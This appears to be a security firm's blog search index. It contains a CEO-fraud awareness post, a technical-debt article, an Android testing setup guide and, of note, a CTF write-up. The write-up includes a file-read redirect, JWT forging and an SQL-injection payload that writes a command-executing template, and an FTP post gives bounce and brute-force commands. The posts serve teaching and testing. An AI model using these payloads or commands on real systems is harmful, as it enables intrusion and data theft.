{"config":{"lang":["en","es"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Atlansec","text":"<p>Welcome to Material for MkDocs.</p>"},{"location":"blog/","title":"Welcome to our Blog","text":""},{"location":"blog/posts/02-02-2025/","title":"The Costly Lesson of CEO Fraud: Why Employee Cybersecurity Training is Crucial","text":"<p>January 16, 2016 \u2013 Ried im Innkreis, Austria. At the offices of FACC Operations GmbH (an Austrian manufacturer of aerospace components), an employee from the finance department received an urgent email that appeared to come directly from the company\u2019s CEO.</p> <p>The request was clear: a million-euro transfer was needed to finalize a \"strategic project\".</p> <p>Under pressure due to the \"confidential\" nature of the request and the authority of the sender, the employee proceeded with the transaction \u2014without verifying its legitimacy.</p> <p>A few days later, FACC discovered it had been scammed. The email had not come from the real CEO but from cybercriminals who had forged his identity.As a result, the company lost approximately 42 million euros in a single bank transfer. </p> <p>This case shows how lack of cybersecurity awareness and training can lead to massive financial losses, not necessarily due to technical failures or software vulnerabilities, but rather the human factor.</p>"},{"location":"blog/posts/02-02-2025/#why-invest-resources-in-employee-training","title":"Why Invest Resources in Employee Training?","text":"<ul> <li>The Most Vulnerable Link</li> </ul> <p>Even if you have state-of-the-art technological measures, if staff aren\u2019t vigilant, employees become the easiest entry point for attackers.</p> <ul> <li>Social Engineering and Manipulation</li> </ul> <p>Phishing and BEC attacks exploit trust and authority rather than hacking technical vulnerabilities.</p> <ul> <li>Economic and Reputational Consequences</li> </ul> <p>A single fraudulent transaction can cause multi-million-euro losses and irreparable damage to a company's reputation.</p> <ul> <li>False Sense of Security</li> </ul> <p>Thinking, \"This won't happen to us\", is a serious mistake. Cybercriminals continuously refine their methods, targeting organizations of all sizes.</p>"},{"location":"blog/posts/02-02-2025/#how-can-we-prevent-these-situations","title":"How Can We Prevent These Situations?","text":"<ul> <li>Continuous Training</li> </ul> <p>Organize workshops, webinars, and phishing or BEC attack simulations. Teach employees to spot suspicious emails, slightly altered sender addresses, and exaggerated urgency or confidentiality tactics.</p> <ul> <li>Internal Verification Policies</li> </ul> <p>Establish protocols that require phone or in-person confirmation for high-value transfers. Demand dual approval or signatures from multiple executives for large financial transactions.</p> <ul> <li>Multi-Factor Authentication (MFA)</li> </ul> <p>A username and password alone are not enough. Two-step or multi-step verification (one-time  codes, authentication apps, physical tokens) makes unauthorized access more difficult, especially when credentials are compromised through phishing.</p> <ul> <li>Culture of \u201cConstructive Distrust\u201d</li> </ul> <p>Encourage employees to report or question the legitimacy of an email whenever in doubt, without fear of repercussions. Create clear channels of communication to quickly report anomalies.</p>"},{"location":"blog/posts/02-02-2025/#conclusions","title":"Conclusions","text":"<p>The FACC case proves that a single human lapse can cause millions in losses and severe reputational damage. There was no malware, no network breach\u2014just a well-crafted email that exploited human trust.</p> <p>Cybersecurity is not just about firewalls and antivirus software\u2014it\u2019s about building a security-first culture through training, awareness, and strict protocols. When every employee understands the risks and knows how to respond, the human factor transforms from the weakest link into the first line of defense.</p> <p>Regular phishing simulations are essential for strengthening a company's cybersecurity posture. Cybercriminals continuously refine their tactics, making employees the first line of defense against attacks like Business Email Compromise (BEC) and credential theft. By conducting periodic phishing tests, organizations can reinforce security awareness, and train staff to recognize and report suspicious emails. This proactive approach reduces human error, minimizes financial and reputational risks, and fosters a security-conscious culture within the company.</p>"},{"location":"blog/posts/02-02-2025/#other-cases","title":"Other Cases","text":""},{"location":"blog/posts/02-02-2025/#google-and-facebook","title":"Google and Facebook","text":"<p>A Lithuanian scammer sent fraudulent emails for several years, posing as a hardware supplier. Both Google and Facebook transferred funds totaling over $100 million. Read more on BBC | Read more on CNBC </p>"},{"location":"blog/posts/02-02-2025/#toyota-boshoku","title":"Toyota Boshoku","text":"<p>A Toyota subsidiary transferred approximately $37 million to cybercriminals after receiving genuine-looking fraudulent emails disguised as supplier communications. Read more on Tripwire </p>"},{"location":"blog/posts/02-02-2025/#crelan-bank","title":"Crelan Bank","text":"<p>Belgium\u2019s Crelan Bank lost \u20ac70 million in a Business Email Compromise (BEC) attack, where cybercriminals posed as high-ranking executives to request transfers. Read more on Help Net Security </p> <p> Stay safe. Stay smart. Stay secure.  </p>"},{"location":"blog/posts/08-12-2024/","title":"Challenge, Train, Flag: Blueprint Heist","text":"<p>At Atlansec, we are committed to CTFs as a key learning tool under the learning by doing methodology. We believe that facing practical challenges is the best way to develop technical skills and foster creativity. With this section we want to spread the value of CTFs, share writeups of challenges of a certain technical complexity and bring the community closer to a practical and technical approach to learning.</p>"},{"location":"blog/posts/08-12-2024/#what-is-a-ctf","title":"What is a CTF?","text":"<p>Capture the Flag (CTF) competitions are cybersecurity challenges where participants tackle a variety of technical problems to find \"flags,\" which are hidden markers proving successful completion of a task. CTFs simulate real-world scenarios in areas like cryptography, reverse engineering, web security, forensics, and binary exploitation, helping participants build essential cybersecurity skills.</p> <p>CTFs aren't just competitions; they are a gateway to learning by solving. They teach participants how to think critically, debug complex systems, and adapt under pressure. Each challenge is a story, a puzzle, and a lesson rolled into one.</p> <p>In this series, we'll explore notable CTF challenges, dive into their technical solutions, and highlight the skills they develop. Welcome to Challenge, Train, Flag!</p>"},{"location":"blog/posts/08-12-2024/#key-concepts","title":"Key concepts","text":"<ul> <li> <p>SSRF (Server-Side Request Forgery): Technique that allows an attacker to force a server to make HTTP requests on their behalf. Depending on the context, it can be quite critical as it can allow an attacker to access resources within the target's internal network.</p> </li> <li> <p>JSON Web Token (JWT): An open standard for authenticating and securely transferring information using a token.</p> </li> <li> <p>SQL Injection: An attack that allows malicious SQL code to be injected into a query to manipulate the database query.</p> </li> <li> <p>wkhtmltopdf: Library for converting web content (HTML) to PDF.</p> </li> </ul>"},{"location":"blog/posts/08-12-2024/#the-challenge","title":"The challenge","text":"<p>This time we bring you a challenge from the HTB Business CTF 2024. The challenge is from the web category and although it is listed as easy on the HackTheBox platform, it is one of the most complex web challenges on the platform due to the number of steps that make up the solution.</p> <p>In this challenge we are given the source code of a NodeJS application and access to a web service running the application.</p>"},{"location":"blog/posts/08-12-2024/#understanding-the-application-logic","title":"Understanding the Application Logic","text":"<p>The challenge starts with access to an application of the urban planning commission. When browsing, we notice that clicking on any of the links generates a POST request to the /download path. Let's review its implementation in the routes file:</p> <pre><code>router.post(\"/download\", authMiddleware(\"guest\"), (req, res, next) =&gt; {\n    convertPdf(req, res, next);\n});\n</code></pre> <p>Here we can see that the convertPdf function is responsible for handling the logic of this path. Let's go on to examine its code:</p> <pre><code>async function convertPdf(req, res, next) {\n    try {\n        const { url } = req.body;\n\n        if (!isUrl(url)) {\n            return next(generateError(400, \"Invalid URL\"));\n        }\n\n        const pdfPath = await generatePdf(url);\n        res.sendFile(pdfPath, { root: \".\" });\n    } catch (error) {\n        return next(generateError(500, error.message));\n    }\n}\n</code></pre> <p>After reading this, we can see that the function makes sure that the parameter it receives is a valid URL before passing it to the generatePdf function. Let's look at the latter next:</p> <pre><code>async function generatePdf(urls) {\n    const pdfFilename = generateRandomFilename();\n    const pdfPath = `uploads/${pdfFilename}`;\n\n    try {\n        await generatePdfFromUrl(urls, pdfPath);\n        return pdfPath;\n    } catch (error) {\n        throw new Error(`Error generating PDF: ${error.stack}`);\n    }\n}\n\nasync function generatePdfFromUrl(url, pdfPath) {\n    return new Promise((resolve, reject) =&gt; {\n        wkhtmltopdf(url, { output: pdfPath }, (err) =&gt; {\n            if (err) {\n                reject(err);\n            } else {\n                resolve();\n            }\n        });\n    });\n}\n</code></pre> <p>We note that the generatePdfFromUrl function uses wkhtmltopdf to convert the URL content to a PDF file. This flow opens the door to exploit a SSRF vulnerability in the library.</p>"},{"location":"blog/posts/08-12-2024/#ssrf-to-local-file-read-on-wkhtmltopdf","title":"SSRF to local file read on wkhtmltopdf","text":"<p>Using an attacker-controlled server, we can serve files on a web server to redirect the visitor to local file system locations, in this case converting the SSRF on the server into a way to read internal files such as /etc/passwd. To do this, we create a PHP file with the following content:</p> <pre><code>&lt;?php header('location:file:///etc/passwd'); ?&gt;\n</code></pre> <p>By passing the URL of our server as a parameter to the /download path, the generated PDF will contain the contents of the /etc/passwd file of the server making the request.</p> Reading /etc/passwd with the PDF generator <p>We then modify the PHP file to exfiltrate the application's .env file:</p> <pre><code>&lt;?php header('location:file:///app/.env'); ?&gt;\n</code></pre> Reading env file with the PDF generator"},{"location":"blog/posts/08-12-2024/#jwt-forging","title":"JWT Forging","text":"<p>With the key extracted from the .env file, we can sign valid JWT tokens. We use a tool like JWT.io to generate a token with the administrator role:</p> <pre><code>{\n  \"role\": \"admin\"\n}\n</code></pre> Edit JWT token on JWT.io <p>Using the token we have generated, we will make a request to the internal admin panel endpoint with the following structure:</p> <pre><code>http://127.0.0.1:1337/admin?token=&lt;JWT_admin&gt;\n</code></pre> <p>In the generated PDF we can see the contents of the admin panel.  While this generates a screenshot of the admin panel, it only takes us halfway to our ultimate goal.</p> PDF with the content of the admin panel"},{"location":"blog/posts/08-12-2024/#sql-injection-to-file-upload","title":"SQL injection to file upload","text":"<p>Analysing the rest of the application code, we discovered that the GraphQL endpoint is vulnerable to SQL injection in the getDataByName query. However, a robust regular expression is used to filter out malicious entries:</p> <pre><code>function detectSqli(query) {\n    const pattern = /^.*[!#$%^&amp;*()\\-_=+{}\\[\\]\\\\|;:'\\\",.&lt;&gt;\\/\\?]/;\n    return pattern.test(query);\n}\n</code></pre> <p>A more detailed analysis shows that the expression is not multiline, which allows us to bypass it with a line break (<code>n</code>).</p> <ul> <li>No line break.</li> </ul> The regex match our payload <ul> <li>With a line break.</li> </ul> The regex doesn\u00b4t match our payload <p>Once this is discovered, we can build a payload for an SQL injection that writes a malicious EJS file to the 404 error path, since the application does not have a path to handle this type of error.</p> <p>The payload we build should be similar to the following, where we include an EJS template that reads the flag by executing the target binary.</p> <pre><code>' UNION SELECT 1, '&lt;p&gt;&lt;%= process.mainModule.require(\"child_process\").execSync(\"/readflag\") %&gt;&lt;/p&gt;', 2, 3 INTO OUTFILE '/app/views/errors/404.ejs'--\n</code></pre> <p>With the malicious file in place, we access a non-existent path to throw a 404 error and execute the /readflag command. This gives us access to the contents of the flag.</p> Reading the flag"},{"location":"blog/posts/09-02-2025/","title":"Technical Debt: A Necessary Evil in Software Development","text":"<p>At Atlansec, while we are primarily a cybersecurity company, we also address technical debt from the perspective of secure software development and infrastructure security. Building secure code and robust infrastructures is key to reducing vulnerabilities and ensuring long-term maintainability.</p> <p>Technical debt is an inevitable enemy that accompanies all software projects to a greater or lesser extent. However, it is not always harmful and, in some cases, can be a necessary strategy to achieve critical objectives within a given timeframe.</p>"},{"location":"blog/posts/09-02-2025/#what-is-technical-debt","title":"What is technical debt?","text":"<p>Technical debt represents the cost of fixing suboptimal or poorly implemented code that results from accelerating development to meet deadlines. It is the price paid when speed is prioritized over software quality.</p> <p>Its origin lies in the need to quickly release new functionalities, often sacrificing fundamental aspects such as maintainability and code clarity. But is it always negative?</p>"},{"location":"blog/posts/09-02-2025/#is-technical-debt-inherently-bad","title":"Is technical debt inherently bad?","text":"<p>It depends on the context. Accelerating development in a controlled manner to meet a critical deadline is not the same as writing messy code due to ignorance or lack of good practices.</p> <p>Asana summarizes this concept well into four quadrants of technical debt:</p> Asana tech debt quadrant"},{"location":"blog/posts/09-02-2025/#the-4-quadrants-of-technical-debt","title":"The 4 Quadrants of Technical Debt","text":"<ol> <li>Prudent and Deliberate: The conscious decision to implement a quick solution and deal with the consequences later. This type of debt is acceptable when the risk is low, and the advantages of rapid delivery outweigh the disadvantages.</li> <li>Reckless and Deliberate: Having the knowledge and capability to write good code but choosing to prioritize speed without a strategy to mitigate the resulting debt. This approach often leads to long-term problems.</li> <li>Prudent and Inadvertent: Trying to produce the best possible code but later discovering a better solution. In this case, the debt is not due to bad practices but rather the natural learning and evolution of the software.</li> <li>Reckless and Inadvertent: Debt is generated without awareness, either due to ignorance or lack of experience in good development practices. This type of debt is particularly risky as it can accumulate without the team realizing it.</li> </ol>"},{"location":"blog/posts/09-02-2025/#types-of-technical-debt","title":"Types of Technical Debt","text":""},{"location":"blog/posts/09-02-2025/#1-intentional","title":"1. Intentional","text":"<p>This type of debt is generated when deliberate decisions are made to prioritize functionality delivery, knowing that the code will require improvements in the future. It is common in projects with tight deadlines or when an idea needs to be validated before optimizing the code.</p>"},{"location":"blog/posts/09-02-2025/#2-unintentional","title":"2. Unintentional","text":"<p>It occurs due to errors, lack of knowledge, or poorly written code without the team being aware of the consequences. This debt is often the most dangerous as it can accumulate to an unmanageable level.</p>"},{"location":"blog/posts/09-02-2025/#examples-of-technical-debt","title":"Examples of Technical Debt","text":"<p>Technical debt appears in many forms and can arise from various causes. Below are some common examples found in software development projects:</p> <ul> <li>Architectural Technical Debt: A deficient architectural design can lead to significant long-term problems. For example:</li> <li>Difficult-to-scale monoliths: A single code block can make scalability and flexibility challenging.</li> <li>Poor separation of concerns: A poorly designed architecture can hinder modularity and code reuse.</li> <li>Excessive dependencies: High coupling between components makes modifications costly and risky.</li> <li>Lack of architectural documentation: Without clear guidance, the team can make decisions that exacerbate technical debt.</li> <li>Insufficient documentation: Projects with poor or nonexistent documentation can lead developers to misinterpret code purposes, features, or architecture. This creates a knowledge gap, which can accumulate technical debt when incorrect assumptions are made or when new developers struggle to understand the system.</li> <li>Duplicated code: Redundant code or copying and pasting code in different parts of the system suggests that the team has not adequately considered code reuse opportunities.</li> <li>Outdated libraries or APIs: If a project relies on outdated libraries or APIs, it will become increasingly difficult to secure, maintain, and expand as those dependencies become unsupported.</li> </ul>"},{"location":"blog/posts/09-02-2025/#impact-of-technical-debt","title":"Impact of Technical Debt","text":"<p>Technical debt can have a significant impact on software development and business operations. Some negative consequences include:</p>"},{"location":"blog/posts/09-02-2025/#development-delays","title":"Development Delays","text":"<p>As technical debt accumulates, the time required to implement new features or fix issues increases. The shortcuts taken initially result in greater effort and more time spent later.</p>"},{"location":"blog/posts/09-02-2025/#higher-maintenance-costs","title":"Higher Maintenance Costs","text":"<p>Maintaining software with technical debt requires more time and resources. Underlying issues must be addressed before additional changes or improvements can be made, increasing long-term operational costs.</p>"},{"location":"blog/posts/09-02-2025/#lower-software-quality","title":"Lower Software Quality","text":"<p>Technical debt often translates into low-quality code, which can lead to frequent errors and failures. This affects customer satisfaction and the company's reputation.</p>"},{"location":"blog/posts/09-02-2025/#difficulty-in-attracting-and-retaining-talent","title":"Difficulty in Attracting and Retaining Talent","text":"<p>Skilled developers prefer to work on well-maintained and technically solid projects. Accumulating technical debt can make it harder to hire and retain qualified personnel.</p>"},{"location":"blog/posts/09-02-2025/#how-to-manage-and-reduce-technical-debt","title":"How to Manage and Reduce Technical Debt","text":"<p>At Atlansec, we understand that managing technical debt is crucial to the success of any software project. Therefore, we adopt a proactive approach based on the following strategies:</p>"},{"location":"blog/posts/09-02-2025/#1-continuous-refactoring","title":"1. Continuous Refactoring","text":"<p>Adopting a culture of continuous refactoring helps improve code quality without affecting the delivery of new features. Frequent small adjustments can prevent technical debt accumulation.</p>"},{"location":"blog/posts/09-02-2025/#2-code-reviews","title":"2. Code Reviews","text":"<p>Code reviews allow problems to be identified before they become debt. Encouraging collaboration among developers ensures better practices and higher code quality.</p>"},{"location":"blog/posts/09-02-2025/#3-automating-testing-and-cicd","title":"3. Automating Testing and CI/CD","text":"<p>Using automated testing and continuous integration/deployment (CI/CD) pipelines enables rapid issue detection and prevents the accumulation of unintentional technical debt.</p>"},{"location":"blog/posts/09-02-2025/#4-documentation-and-best-practices","title":"4. Documentation and Best Practices","text":"<p>Writing clear documentation and following established design patterns facilitates code maintainability and reduces the risk of generating debt due to misunderstandings.</p>"},{"location":"blog/posts/09-02-2025/#5-planning-technically-from-the-beginning","title":"5. Planning Technically from the Beginning","text":"<p>Focusing on proper architectural design before development begins can prevent long-term problems. Investing time in planning avoids many rushed decisions that generate debt.</p>"},{"location":"blog/posts/09-02-2025/#related-links","title":"Related Links","text":"<ul> <li>Asana - Technical Debt</li> <li>Atlassian - Technical Debt in Agile</li> </ul>"},{"location":"blog/posts/14-11-2024/","title":"Intro to FTP","text":"<p>FTP (File Transfer Protocol) is one of the oldest and most widely used protocols for transferring files between computers. While it provides a simple way to move data, its default configuration lacks security, making it a common target for attackers. In this article, we\u2019ll cover the basics of FTP, its communication modes, essential commands, and common misconfigurations that could be exploited. Whether you're a cybersecurity enthusiast or a penetration tester, understanding FTP is crucial for securing or assessing network environments.</p> <p>This protocol has a client-server architecture using a server to serve files that can be accessed by N clients. By default, the information is transmitted in plain text, although there is an encrypted version of it called SFTP (Secure File Transfer Protocol).</p> <p>Although there are implementations with a graphical interface, in this article we will make use of the FTP command line tool, which gives us a lot of flexibility when working with the protocol. In later articles we will explore the main client and server implementations, although in this one we will focus on explaining the basic concepts of the protocol, how to work with it and how to take advantage of some misconfigurations.</p>"},{"location":"blog/posts/14-11-2024/#theory","title":"Theory","text":""},{"location":"blog/posts/14-11-2024/#communication-channels","title":"Communication channels","text":"<p>For FTP to work, two communication channels are required, one for sending commands and the other for data.</p>"},{"location":"blog/posts/14-11-2024/#connection-modes","title":"Connection modes","text":""},{"location":"blog/posts/14-11-2024/#active","title":"Active","text":"<p>This is the default connection mode for FTP connections, in which two events occur:</p> <ul> <li>A command channel is established in the connection to the server between the server's command port (21 by default) and a port greater than 1023 on the client side (we will refer to this as P).</li> <li>Once the data connection is established, an attempt is made to open a connection from the server's data port (20 by default) to port P+1 on the client.</li> </ul> <p>Note</p> <p>Active mode may present problems with client firewalls because it attempts to create a direct connection to a client-side port, which may be blocked by certain firewalls.</p>"},{"location":"blog/posts/14-11-2024/#passive","title":"Passive","text":"<p>This mode arises as a solution to the problem of client firewalls, here the workflow is modified so that both the data connection and the client connection are initiated from the client, we can break it down into two events.</p> <ul> <li>A command channel is established on the server connection between the server command port (21 by default) and a port greater than 1023 on the client side (we will refer to this as P).</li> <li>Once the data connection is established a data connection is opened from port P+1 on the client to a port on the server data channel, this process is repeated for each file transfer occupying a different server port on each connection (this can be configured in most server side software) .</li> </ul> <p>Note</p> <p>Passive mode requires the opening of a range of ports in the firewall, this can generate some security problems if this port opening is not configured correctly.</p>"},{"location":"blog/posts/14-11-2024/#ftp-commands","title":"FTP commands","text":"<pre><code>CWD -&gt; Changes the current directory to the specified one\nDELE -&gt; Deletes the specified file\nEPRT -&gt; Establish a socket for data connection\nLIST -&gt; List the files in the current directory\nPASV -&gt; Change mode to passive mode\nPWD -&gt; Displays the current directory \nRETR -&gt; Download the specified file\n</code></pre>"},{"location":"blog/posts/14-11-2024/#anonymous-login","title":"Anonymous login","text":"<p>There is an FTP configuration that allows the use of a login to share files for any user that requires it, in case this configuration is enabled a user could use anonymous as login name and any password to access the server as a user with low privileges, although in certain cases this can lead to compromise the entire system.</p>"},{"location":"blog/posts/14-11-2024/#ftp-bounce-port-scan","title":"FTP Bounce port scan","text":"<p>It is possible to abuse the PORT and ERPT commands to perform an open port scan via an FTP server.</p>"},{"location":"blog/posts/14-11-2024/#nmap","title":"Nmap","text":"<pre><code>nmap -b &lt;name&gt;:&lt;pass&gt;@&lt;ftp_server&gt; &lt;victim&gt;\n</code></pre>"},{"location":"blog/posts/14-11-2024/#hand-made","title":"Hand-made","text":"<p>Once connected we can perform the port scan using the PORT and ERPT commands followed by a LIST command.</p> <p>Here is an example for scanning port 9091 on host 10.10.10.14</p> <pre><code>PORT 10.10.10.14.14.0.9091\nEPRT |2|10.10.10.14|9091||\n\nLIST\n</code></pre> <p>If the response is a 150 the port is open, in case of receiving a 415 the port is closed.</p>"},{"location":"blog/posts/14-11-2024/#ftp-bounce-file-get","title":"FTP Bounce file get","text":"<p>This attack allows an attacker to download files from an FTP server not accessible by the attacker, but which can be reached by an FTP server accessible by the attacker.</p> Net Diagram <p>This attack has the following prerequisites:</p> <ul> <li>Valid credentials for External FTP.</li> <li>Valid credentials for Internal FTP.</li> <li>Write access for External FTP.</li> <li>PORT command execution permissions on both External and Internal.</li> </ul> <p>First of all we will deploy an FTP server on the attacker's machine, this server has to support passive mode.</p> <p>Once deployed we will open a passive connection with the PASV command and tell it to save it with STOR output.ext .</p> <p>Now we will create a file with the commands we want to launch against the second server, an example would be the following:</p> <pre><code>user ftp # User for the internal server\npass password # Password for the internal server\ncwd /DIRECTORY\ntype i\nport F,F,F,F,F,F,X,X #Our passive port\nretr file.ext\nquit\n^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@\n^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@\n</code></pre> <p>Now we upload it with PUT and from the external server we execute the following commands:</p> <pre><code>put payload\nquote \"port C,C,C,C,C,0,21\" # IP of internal server\nquote \"retr payload\"\n</code></pre> <p>After this we will have the file.ext file on our server as output.ext</p>"},{"location":"blog/posts/14-11-2024/#brute-force-attack","title":"Brute force attack","text":"<p>Many FTP servers do not have protection against brute force attacks. Having a user or a list of them we can carry out a brute force attack with different credentials obtained from various sources, although there are several tools for this purpose, the two most common are NetExec and Hydra.  </p>"},{"location":"blog/posts/14-11-2024/#netexec","title":"NetExec","text":"<pre><code>nxc ftp IP -u userfile -p passwordfile\n</code></pre>"},{"location":"blog/posts/14-11-2024/#hydra","title":"Hydra","text":"<pre><code>hydra -L userfile -P passwordfile ftp://IP\n</code></pre>"},{"location":"blog/posts/14-11-2024/#full-content-backup","title":"Full content backup","text":"<p>This is not an attack per se, but it is quite useful, as it allows us to download all accessible files from the server using a single command.</p> <pre><code>wget -r ftp://IP/dir/* --ftp-user=username --ftp-password=password\n</code></pre>"},{"location":"blog/posts/14-11-2024/#ftp-file-upload-to-rce","title":"FTP file upload to RCE","text":"<p>In certain circumstances, permission to upload files to the server along with other misconfigurations can lead to obtaining remote execution of commands on the server.</p> <p>The most common case is the possibility of uploading files to be served by a web server, where we could upload a webshell interpretable by the server to obtain command execution.</p>"},{"location":"blog/posts/14-11-2024/#sniffing-credentials","title":"Sniffing credentials","text":"<p>Since FTP works by default in plain text, it is possible for an attacker on the same network to use a sniffer and capture both the credentials and the FTP conversation.</p> <p>In the next article of this series on FTP we will discuss common implementation errors and some known vulnerabilities of some implementations of the protocol.</p>"},{"location":"blog/posts/15-12-2024/","title":"Installation and Configuration of Android Studio and Related Tools on Linux/Debian","text":"<p>This article outlines the necessary steps to create a dynamic testing environment on Linux/Debian, detailing how to integrate tools such as Burp Suite, Frida, and Objection, and their specific purposes. It also covers procedures for managing certificates on an Android emulator and configuring a dynamic testing environment. Follow the detailed instructions to achieve a functional and analysis-ready setup.</p>"},{"location":"blog/posts/15-12-2024/#installing-android-studio","title":"Installing Android Studio","text":"<p>Android Studio serves as the primary IDE for Android application development and testing, providing an environment for app creation, emulation, and debugging, we are going to use this for easy download and installation of avds.</p>"},{"location":"blog/posts/15-12-2024/#step-1-download-android-studio","title":"Step 1: Download Android Studio","text":"<ol> <li>Download the Android Studio ZIP file from the official Android Studio page.</li> </ol>"},{"location":"blog/posts/15-12-2024/#step-2-extraction-and-setup","title":"Step 2: Extraction and Setup","text":"<p>Extract the downloaded file:</p> <pre><code>unzip android-studio-*.zip -d ~/android-studio\n</code></pre>"},{"location":"blog/posts/15-12-2024/#step-3-create-symbolic-links","title":"Step 3: Create Symbolic Links","text":"<p>To streamline the use of Android Studio and the emulator, create symbolic links:</p> <pre><code>sudo ln -s ~/android-studio/bin/studio.sh /usr/local/bin/androidStudio\nsudo ln -s ~/android-studio/emulator/emulator /usr/local/bin/androidEmulator\n</code></pre> <p>Now you can run Android Studio with:</p> <pre><code>androidStudio\n</code></pre> <p>And the emulator with:</p> <pre><code>androidEmulator\n</code></pre>"},{"location":"blog/posts/15-12-2024/#step-4-use-a-physical-device-optional","title":"Step 4: Use a Physical Device (Optional)","text":"<p>Although this guide primarily uses an Android emulator, you can opt to use a physical device for a more realistic experience. This requires enabling developer options and USB debugging on your device.</p> <ol> <li>Enable Developer Options:</li> <li> <p>Go to Settings &gt; About Phone and tap Build Number several times until developer options are enabled.</p> </li> <li> <p>Enable USB Debugging:</p> </li> <li>In Settings &gt; Developer Options, enable USB Debugging.</li> </ol> <p>Connect your device to the computer via USB. You can now use <code>adb</code> commands to install apps, debug, and perform the same tests as with the emulator.</p>"},{"location":"blog/posts/15-12-2024/#installing-burp-certificates-on-an-android-emulator","title":"Installing Burp Certificates on an Android Emulator","text":"<p>Burp Suite is used to intercept and analyze traffic between the Android application and backend servers. Installing its certificate allows HTTPS traffic to be decrypted for analysis.</p>"},{"location":"blog/posts/15-12-2024/#step-1-start-the-emulator-with-a-writable-system","title":"Step 1: Start the Emulator with a Writable System","text":"<ol> <li> <p>List available AVDs (Android Virtual Devices) with the <code>-list-avds</code> option: <pre><code>androidEmulator -list-avds\n</code></pre></p> </li> <li> <p>Start the emulator with the <code>-writable-system</code> option: <pre><code>androidEmulator -avd &lt;avd_name&gt; -writable-system\n</code></pre></p> </li> </ol>"},{"location":"blog/posts/15-12-2024/#step-2-export-the-certificate-from-burp-suite","title":"Step 2: Export the Certificate from Burp Suite","text":"<ol> <li>From Burp Suite, export the certificate in DER format:</li> <li>Go to Proxy &gt; Options &gt; Import/export CA certificate.</li> <li>Export the file as <code>burp-cert.der</code>.</li> </ol>"},{"location":"blog/posts/15-12-2024/#step-3-convert-and-copy-the-certificate-to-the-emulator","title":"Step 3: Convert and Copy the Certificate to the Emulator","text":"<ol> <li> <p>Convert the certificate from DER to PEM format: <pre><code>openssl x509 -inform DER -in burp-cert.der -out burp-cert.pem\n</code></pre></p> </li> <li> <p>Get the certificate hash: <pre><code>openssl x509 -inform PEM -subject_hash_old -in burp-cert.pem | head -1\n</code></pre></p> </li> <li> <p>Rename the certificate using its hash: <pre><code>mv burp-cert.pem 9a5ba575.0\n</code></pre></p> </li> <li> <p>Push the certificate to the emulator: <pre><code>adb root\nadb remount\nadb push 9a5ba575.0 /sdcard/\nadb shell mv /sdcard/9a5ba575.0 /system/etc/security/cacerts/\nadb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0\n</code></pre></p> </li> </ol>"},{"location":"blog/posts/15-12-2024/#step-4-verification","title":"Step 4: Verification","text":"<p>Restart the emulator and verify the installation by checking Settings -&gt; Security -&gt; Trusted Credentials for the \"PortSwigger CA\" certificate.</p>"},{"location":"blog/posts/15-12-2024/#installing-frida-and-objection-in-a-python-virtual-environment","title":"Installing Frida and Objection in a Python Virtual Environment","text":"<p>Frida is a dynamic instrumentation toolkit for debugging, testing, and reverse engineering Android applications. Objection is a wrapper for Frida that simplifies security assessments by automating common testing tasks.</p>"},{"location":"blog/posts/15-12-2024/#step-1-create-a-virtual-environment","title":"Step 1: Create a Virtual Environment","text":"<ol> <li> <p>Create a Python virtual environment to isolate tool dependencies: <pre><code>python3 -m venv frida-env\n</code></pre></p> </li> <li> <p>Activate the virtual environment: <pre><code>source frida-env/bin/activate\n</code></pre></p> </li> </ol>"},{"location":"blog/posts/15-12-2024/#step-2-install-frida-and-objection","title":"Step 2: Install Frida and Objection","text":"<ol> <li>Install both tools using <code>pip</code>: <pre><code>pip install frida-tools objection\n</code></pre></li> </ol>"},{"location":"blog/posts/15-12-2024/#configuring-frida-server-on-the-emulator","title":"Configuring Frida-Server on the Emulator","text":"<p>The Frida server facilitates communication between the Frida client on your host machine and the Android emulator for live application instrumentation.</p>"},{"location":"blog/posts/15-12-2024/#step-1-download-the-frida-server-file","title":"Step 1: Download the Frida-Server File","text":"<ol> <li> <p>Download the <code>frida-server</code> binary from the official Frida releases page.</p> </li> <li> <p>Extract the downloaded file.</p> </li> </ol>"},{"location":"blog/posts/15-12-2024/#step-2-upload-and-configure-frida-server-on-the-emulator","title":"Step 2: Upload and Configure Frida-Server on the Emulator","text":"<ol> <li> <p>Push the <code>frida-server</code> binary to the emulator: <pre><code>adb push frida-server /data/local/tmp/\nadb shell chmod 755 /data/local/tmp/frida-server\n</code></pre></p> </li> <li> <p>Start the Frida server: <pre><code>adb shell /data/local/tmp/frida-server &amp;\n</code></pre></p> </li> </ol>"},{"location":"blog/posts/15-12-2024/#step-3-verification","title":"Step 3: Verification","text":"<p>Ensure Frida is working by listing processes on the emulator:</p> <pre><code>frida-ps -U\n</code></pre>"},{"location":"blog/posts/15-12-2024/#method-inspection-revisiting-crackme-1","title":"Method Inspection: Revisiting Crackme 1","text":"<p>To demonstrate the power of dynamic analysis, we will use the \"Uncrackable1\" APK to explore how these techniques can be applied in practice.</p>"},{"location":"blog/posts/15-12-2024/#exploring-the-application-with-apklab","title":"Exploring the Application with APKLab","text":"<p>To understand the application better, decompile the APK to reveal its Java source code using the APKLab extension for Visual Studio Code. This extension integrates with tools like JADX to simplify the process.</p>"},{"location":"blog/posts/15-12-2024/#step-1-set-up-apklab","title":"Step 1: Set up APKLab","text":"<ol> <li>Install APKLab from the Visual Studio Code extensions marketplace.</li> <li>Open the APK file in APKLab to automatically decompile the application and display the code.</li> </ol> APK Lab Visual Studio Extension"},{"location":"blog/posts/15-12-2024/#step-2-locate-root-detection-code","title":"Step 2: Locate Root Detection Code","text":"<ol> <li> <p>Use the search functionality in APKLab to locate code responsible for root detection by searching for phrases like \"Root detected.\"</p> </li> <li> <p>Navigate to the implementation by clicking on the search results.</p> </li> </ol>"},{"location":"blog/posts/15-12-2024/#bypassing-root-detection","title":"Bypassing Root Detection","text":"<p>We can bypass root detection by modifying what methods like <code>c.a()</code>, <code>c.b()</code>, and <code>c.c()</code> return. Alternatively, we can change the implementation of the <code>onClick()</code> method in <code>MainActivity</code>, which closes the app when \"OK\" is clicked on the alert.</p>"},{"location":"blog/posts/15-12-2024/#using-frida-to-instrument-the-app","title":"Using Frida to Instrument the App","text":""},{"location":"blog/posts/15-12-2024/#step-1-find-the-process-id","title":"Step 1: Find the Process 